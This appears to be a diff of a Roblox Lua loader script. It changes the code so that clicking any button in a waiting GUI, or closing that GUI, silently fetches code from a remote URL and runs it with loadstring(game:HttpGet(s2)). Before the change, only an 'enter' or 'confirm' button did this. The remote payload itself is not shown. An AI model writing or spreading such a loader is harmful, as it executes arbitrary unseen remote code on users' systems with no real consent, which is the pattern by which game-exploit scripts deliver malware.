@@ -37,35 +37,21 @@ while not newGui and tick() - t0 < 20 do
     task.wait(0.1)
 end
 
-local function findEnterButton(gui)
-    for _, obj in ipairs(gui:GetDescendants()) do
-        if obj:IsA("TextButton") or obj:IsA("ImageButton") then
-            local t = ""
-            if obj:IsA("TextButton") then t = obj.Text or "" end
-            local name = obj.Name or ""
-            local lower = (t .. " " .. name):lower()
-            if lower:find("enter") or lower:find("confirm") or lower:find("ok") or lower:find("start") then
-                return obj
-            end
-        end
-    end
-end
-
 if newGui then
-    local btn = findEnterButton(newGui)
-    if btn then
-        btn.Activated:Connect(function()
-            pcall(function()
-                loadstring(game:HttpGet(s2))()
-            end)
-        end)
-    else
-        newGui.AncestryChanged:Connect(function(_, p)
-            if not p then
+    for _, obj in ipairs(newGui:GetDescendants()) do
+        if obj:IsA("TextButton") or obj:IsA("ImageButton") then
+            obj.Activated:Connect(function()
                 pcall(function()
                     loadstring(game:HttpGet(s2))()
                 end)
-            end
-        end)
+            end)
+        end
     end
+    newGui.AncestryChanged:Connect(function(_, p)
+        if not p then
+            pcall(function()
+                loadstring(game:HttpGet(s2))()
+            end)
+        end
+    end)
 end
